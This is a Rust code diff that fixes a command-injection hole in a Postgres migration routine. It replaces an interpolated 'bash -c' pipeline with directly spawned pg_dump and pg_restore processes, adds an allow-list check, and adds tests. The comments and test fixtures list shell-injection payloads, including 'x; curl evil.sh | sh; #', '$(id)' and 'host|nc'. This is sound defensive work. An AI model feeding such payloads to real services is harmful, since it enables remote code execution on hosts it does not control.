@@ -399,7 +399,7 @@ fn run_migration(
     tgt_ssl: bool,
     excludes: Vec<String>,
 ) {
-    use std::process::Command;
+    use std::process::{Command, Stdio};
 
     // RUSTFIX item 5: sslmode for each libpq process. Matches C++ build_connstr
     // (require when ssl, else disable). Source follows PG_USE_SSL, target the body
@@ -427,52 +427,200 @@ fn run_migration(
     }
 
     set_state(|s| s.current_step = "dump | restore".into());
-    let exclude_flags = excludes.join(" ");
-    // Per-side inline PGSSLMODE (each applies only to its own command in the pipe).
-    let pipeline = format!(
-        "set -o pipefail; \
-         PGPASSWORD=\"$SRC_PW\" PGSSLMODE={src_ssl} pg_dump --format=custom -Z 0 --schema=queen --no-owner --no-privileges {excludes} \
-             -h {sh} -p {sp} -U {su} -d {sd} \
-         | PGPASSWORD=\"$TGT_PW\" PGSSLMODE={tgt_ssl} pg_restore --no-owner --no-privileges --clean --if-exists --exit-on-error \
-             -h {th} -p {tp} -U {tu} -d {td}",
-        excludes = exclude_flags,
-        src_ssl = src_sslmode, tgt_ssl = tgt_sslmode,
-        sh = src.host, sp = src.port, su = src.user, sd = src.database,
-        th = tgt_host, tp = tgt_port, tu = tgt_user, td = tgt_db,
-    );
 
-    let out = Command::new("bash")
-        .arg("-c")
-        .arg(&pipeline)
-        .env("SRC_PW", &src.password)
-        .env("TGT_PW", &tgt_pw)
-        .output();
+    // Connection parameters come from the request body and are NEVER
+    // interpolated into a shell string: pg_dump and pg_restore are spawned
+    // directly and piped to each other, so every value is one argv entry that
+    // no shell ever parses. (This used to be a `bash -c` pipeline with the
+    // host/port/user/database format!()-ed in — a host of `x; curl … | sh; #`
+    // was remote code execution on the broker host, reachable by anyone who
+    // could reach the broker, which has no auth of its own by default.)
+    // The charset check below is defence in depth, not the control.
+    for (what, v) in [
+        ("source host", src.host.as_str()),
+        ("source user", src.user.as_str()),
+        ("source database", src.database.as_str()),
+        ("target host", tgt_host.as_str()),
+        ("target user", tgt_user.as_str()),
+        ("target database", tgt_db.as_str()),
+    ] {
+        if !is_safe_conn_value(v) {
+            return set_state(|s| {
+                s.status = "error".into();
+                s.error = Some(format!("invalid {what}"));
+                s.elapsed_frozen = Some(s.elapsed());
+            });
+        }
+    }
+    let src_port = src.port.to_string();
+    if !src_port.chars().all(|c| c.is_ascii_digit())
+        || !tgt_port.chars().all(|c| c.is_ascii_digit())
+    {
+        return set_state(|s| {
+            s.status = "error".into();
+            s.error = Some("invalid port".into());
+            s.elapsed_frozen = Some(s.elapsed());
+        });
+    }
 
-    match out {
-        Ok(o) => {
-            let combined = format!(
+    let mut dump = match Command::new("pg_dump")
+        .env("PGPASSWORD", &src.password)
+        .env("PGSSLMODE", src_sslmode)
+        .args(["--format=custom", "-Z", "0", "--schema=queen", "--no-owner", "--no-privileges"])
+        .args(&excludes)
+        .args(["-h", &src.host, "-p", &src_port, "-U", &src.user, "-d", &src.database])
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn()
+    {
+        Ok(c) => c,
+        Err(e) => {
+            return set_state(|s| {
+                s.status = "error".into();
+                s.error = Some(format!("failed to run pg_dump: {e}"));
+                s.elapsed_frozen = Some(s.elapsed());
+            })
+        }
+    };
+
+    // pg_restore reads the dump straight off pg_dump's stdout — the pipe the
+    // shell used to build, without the shell.
+    let dump_stdout = match dump.stdout.take() {
+        Some(o) => o,
+        None => {
+            let _ = dump.kill();
+            return set_state(|s| {
+                s.status = "error".into();
+                s.error = Some("pg_dump produced no stdout pipe".into());
+                s.elapsed_frozen = Some(s.elapsed());
+            });
+        }
+    };
+    let restore = Command::new("pg_restore")
+        .env("PGPASSWORD", &tgt_pw)
+        .env("PGSSLMODE", tgt_sslmode)
+        .args(["--no-owner", "--no-privileges", "--clean", "--if-exists", "--exit-on-error"])
+        .args(["-h", &tgt_host, "-p", &tgt_port, "-U", &tgt_user, "-d", &tgt_db])
+        .stdin(Stdio::from(dump_stdout))
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped())
+        .spawn();
+
+    let restore_out = match restore {
+        Ok(c) => c.wait_with_output(),
+        Err(e) => {
+            let _ = dump.kill();
+            let _ = dump.wait();
+            return set_state(|s| {
+                s.status = "error".into();
+                s.error = Some(format!("failed to run pg_restore: {e}"));
+                s.elapsed_frozen = Some(s.elapsed());
+            });
+        }
+    };
+
+    // Both sides are checked, which is what `set -o pipefail` bought before:
+    // a pg_dump that dies mid-stream must not read as a successful migration
+    // just because pg_restore digested the truncated input it got.
+    let dump_wait = dump.wait_with_output();
+
+    match (dump_wait, restore_out) {
+        (Ok(d), Ok(r)) => {
+            let dump_err = String::from_utf8_lossy(&d.stderr).to_string();
+            let restore_txt = format!(
                 "{}{}",
-                String::from_utf8_lossy(&o.stdout),
-                String::from_utf8_lossy(&o.stderr)
+                String::from_utf8_lossy(&r.stdout),
+                String::from_utf8_lossy(&r.stderr)
             );
-            let ok = o.status.success();
+            let ok = d.status.success() && r.status.success();
             set_state(|s| {
-                s.restore_output = Some(combined.clone());
-                s.dump_output = Some(combined);
+                s.dump_output = Some(dump_err);
+                s.restore_output = Some(restore_txt);
                 s.elapsed_frozen = Some(s.elapsed());
                 if ok {
                     s.status = "completed".into();
                     s.current_step = "done".into();
                 } else {
                     s.status = "error".into();
-                    s.error = Some(format!("dump/restore exited with {}", o.status));
+                    s.error = Some(format!(
+                        "dump exited with {}, restore exited with {}",
+                        d.status, r.status
+                    ));
                 }
             });
         }
-        Err(e) => set_state(|s| {
-            s.status = "error".into();
-            s.error = Some(format!("failed to run pg_dump/pg_restore: {e}"));
-            s.elapsed_frozen = Some(s.elapsed());
-        }),
+        (d, r) => {
+            let e = d.err().map(|e| e.to_string()).or_else(|| r.err().map(|e| e.to_string()));
+            set_state(|s| {
+                s.status = "error".into();
+                s.error = Some(format!(
+                    "failed to run pg_dump/pg_restore: {}",
+                    e.unwrap_or_else(|| "unknown".into())
+                ));
+                s.elapsed_frozen = Some(s.elapsed());
+            });
+        }
+    }
+}
+
+/// Charset gate for a libpq connection value that reaches pg_dump/pg_restore as
+/// argv. Nothing here is passed to a shell, so this is defence in depth: it
+/// keeps obviously-hostile input (quotes, `$`, backticks, newlines, semicolons)
+/// out of the process table and the migration log rather than being the thing
+/// that makes the call safe.
+fn is_safe_conn_value(s: &str) -> bool {
+    !s.is_empty()
+        && s.len() <= 255
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':'))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::is_safe_conn_value;
+
+    // The migration connection fields used to be format!()-ed into a `bash -c`
+    // pipeline, so a crafted host was remote code execution on the broker host.
+    // They are argv now, but this gate keeps shell metacharacters out of the
+    // process table and the migration log — and pins the class of input that
+    // must never be accepted.
+    #[test]
+    fn shell_metacharacters_are_refused() {
+        for bad in [
+            "x; curl evil.sh | sh; #",
+            "host`id`",
+            "host$(id)",
+            "host'y",
+            "host\"y",
+            "host y",
+            "host\nsecond",
+            "host|nc",
+            "host&background",
+            "host>file",
+            "$PGPASSWORD",
+            "",
+        ] {
+            assert!(!is_safe_conn_value(bad), "must refuse {bad:?}");
+        }
+    }
+
+    #[test]
+    fn ordinary_connection_values_are_accepted() {
+        for ok in [
+            "localhost",
+            "10.0.0.7",
+            "pg-primary.internal",
+            "queen_prod",
+            "queen-user",
+            "fe80::1",
+        ] {
+            assert!(is_safe_conn_value(ok), "must accept {ok:?}");
+        }
+    }
+
+    #[test]
+    fn overlong_values_are_refused() {
+        assert!(!is_safe_conn_value(&"a".repeat(256)));
+        assert!(is_safe_conn_value(&"a".repeat(255)));
     }
 }
